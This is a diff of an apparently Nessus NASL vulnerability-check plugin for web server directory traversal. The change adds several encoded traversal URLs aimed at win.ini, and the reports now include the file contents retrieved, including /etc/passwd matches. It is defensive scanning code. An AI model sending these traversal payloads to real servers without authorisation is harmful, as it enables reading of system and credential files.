@@ -7,11 +7,6 @@
 ##############
 # References:
 ##############
-# Message-ID: <057801c26b19$529b2950$c64896d4@beyondmobile1>
-# Date: Thu, 3 Oct 2002 22:12:31 +0200
-# From: "Aviram Jenik" <aviram@BEYONDSECURITY.COM>
-# Subject: BearShare Directory Traversal Issue Resurfaces
-# To: win2ksecadvice@LISTSERV.NTSECURITY.NET
 #
 # Date: 25 Sep 2002 09:10:45 -0000
 # Message-ID: <20020925091045.29313.qmail@mail.securityfocus.com>
@@ -43,32 +38,22 @@
 #
 # Should also apply for BID 7308, 7378, 7362, 7544, 7715
 #
-# From: "mattmurphy@kc.rr.com" <mattmurphy@kc.rr.com>
-# Subject: Zeroo Folder Traversal Vulnerability
-# To: news@securiteam.com, vulnwatch@vulnwatch.org, bugtraq@securityfocus.com
-# Date: Thu, 21 Nov 2002 19:49:46 -0500
-# Reply-To: mattmurphy@kc.rr.com
-#
-# From: support@securiteam.com
-# Subject: [NEWS] Remote Console Applet Allows Remote File Retrieval
-# To: list@securiteam.com
-# Date: 15 Dec 2002 23:17:34 +0200
-#
 # From:	"scrap" <webmaster@securiteinfo.com>
 # To:	vulnwatch@vulnwatch.org
 # Date:	Thu, 25 Sep 2003 23:19:34 +0200
 # Subject: myServer 0.4.3 Directory Traversal Vulnerability
 #
-
+# http://www.zone-h.org/en/advisories/read/id=3645/
+# http://aluigi.altervista.org/adv/dcam-adv.txt
+#
 
 if(description)
 {
  script_id(10297);
- script_version ("$Revision: 1.29 $");
+ script_version ("$Revision: 1.40 $");
 
  name["english"] = "Web server traversal";
- name["francais"] = "Web server traversal";
- script_name(english:name["english"], francais:name["francais"]);
+ script_name(english:name["english"]);
 
  desc["english"] = "
 It is possible to read arbitrary files on
@@ -82,17 +67,13 @@ Risk factor : High";
  script_description(english:desc["english"]);
 
  summary["english"] = "\..\..\file.txt";
- summary["francais"] = "\..\..\file.txt";
- script_summary(english:summary["english"], francais:summary["francais"]);
+ script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
 
-
- script_copyright(english:"This script is Copyright (C) 1999 Renaud Deraison",
-		francais:"Ce script est Copyright (C) 1999 Renaud Deraison");
- family["english"] = "CGI abuses";
- family["francais"] = "Abus de CGI";
- script_family(english:family["english"], francais:family["francais"]);
+ script_copyright(english:"This script is Copyright (C) 1999 Renaud Deraison");
+ family["english"] = "Web Servers";
+ script_family(english:family["english"]);
  script_dependencie("find_service.nes", "no404.nasl", "httpver.nasl");
  script_require_ports("Services/www", 80);
  exit(0);
@@ -104,35 +85,53 @@ Risk factor : High";
 include("http_func.inc");
 include("http_keepalive.inc");
 
-port = get_kb_item("Services/www");
-if(!port)port = 80;
+port = get_http_port(default:80);
+
 
 if(! get_port_state(port)) exit(0);
-
-qc=1;
-k = string("www/no404/", port);
-if (get_kb_item(k)) qc=0;
 
 i=0;
 r[i] = string("..\\..\\..\\..\\..\\..\\windows\\win.ini");	i=i+1;
 r[i] = string("..\\..\\..\\..\\..\\..\\winnt\\win.ini");	i=i+1;
 r[i] = "/%5c..%5c..%5c..%5cwindows%5cwin.ini";		i=i+1;
 r[i] = "/%5c..%5c..%5c..%5cwindows%5cwin%2eini";	i=i+1;
-r[i] = "/%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cboot.ini";	i=i+1;
 r[i] = "/%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows%2fwin.ini";	i=i+1;
 r[i] = "/%2f..%2f..%2f..%2f..%2f..%2f..%2fwinnt%2fwin.ini";	i=i+1;
 r[i] = string("/.|./.|./.|./.|./.|./.|./.|./winnt/win.ini");	i=i+1;
 r[i] = string("/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/winnt/win.ini"); i=i+1;
 r[i] = string("/.../.../.../.../.../.../.../.../.../winnt/win.ini"); i=i+1;
 r[i] = string("/././././././../../../../../winnt/win.ini"); i=i+1;
+r[i] = ".\.\.\.\.\.\.\.\.\.\/windows/win.ini"; i=i+1;
+r[i] = string("/nessus\\..\\..\\..\\..\\..\\..\\windows\\win.ini");	i=i+1;
+r[i] = string("/nessus\\..\\..\\..\\..\\..\\..\\winnt\\win.ini");	i=i+1;
 r[i] = 0;
 
 for (i=0; r[i]; i=i+1)
 {
-  if (check_win_dir_trav_ka(port: port, url: r[i], quickcheck: qc))
+  if (check_win_dir_trav_ka(port: port, url: r[i]))
   {
+    req = http_get(item: r[i], port:port);
+    rc = http_keepalive_send_recv(port:port, data:req);
+    encaps = get_port_transport(port);
+    if ( encaps >= ENCAPS_SSLv2 ) 
+    exploit_url = string("https://", get_host_ip(), ":", port, r[i]);
+   else
     exploit_url = string("http://", get_host_ip(), ":", port, r[i]);
-    security_hole(port:port, data:string(desc["english"], exploit_url));
+
+   report = "
+It is possible to read arbitrary files on
+the remote server by prepending ../../
+or ..\..\ in front on the file name.
+
+It was possible to read arbitrary files using the URL : 
+" + exploit_url + "
+
+Which produces : 
+" + rc + "
+
+Solution : Use another web server
+Risk factor : High";
+    security_hole(port:port, data:report);
     exit(0);
   }
 }
@@ -152,7 +151,7 @@ for (i = 0; r[i]; i=i+1)
   if(rc == NULL ) exit(0);
   if(egrep(pattern:"root:.*:0:[01]:", string:rc))
   {
-   exploit_url = string("http://", get_host_ip(), ":", port, r[i]);
+   exploit_url = string("http://", get_host_ip(), ":", port, "/", r[i]);
    report = "
 It is possible to read arbitrary files on
 the remote server by prepending ../../
@@ -160,6 +159,9 @@ or ..\..\ in front on the file name.
 
 It was possible to read arbitrary files using the URL : 
 " + exploit_url + "
+
+Which produces : 
+" + rc + "
 
 Solution : Use another web server
 Risk factor : High";
